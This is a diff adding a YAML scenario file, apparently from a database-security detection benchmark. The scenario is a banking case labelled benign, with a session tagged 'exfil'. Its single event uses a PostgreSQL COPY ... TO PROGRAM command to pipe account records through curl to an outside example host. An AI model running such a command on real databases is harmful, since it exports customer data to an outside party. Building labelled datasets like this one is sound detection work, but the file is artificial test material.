@@ -1,0 +1,31 @@
+scenario_id: gen_banking_94_copy_to_program_ben_2669b
+family_id: gen_banking_94_copy_to_program_fam_2669
+domain: banking
+time_of_day: '23:35'
+default_class: benign
+rule_engine_relationship: agrees
+sessions:
+- session_label: exfil
+  role: batch_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT account_id, account_type FROM accounts WHERE branch_id = 'BR-052')
+      TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest -d
+      @-'
+    connects_to:
+      ip: 198.51.100.217
+      port: 8080
+matched_pair_id: gen_banking_94_copy_to_program_pair_2669
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
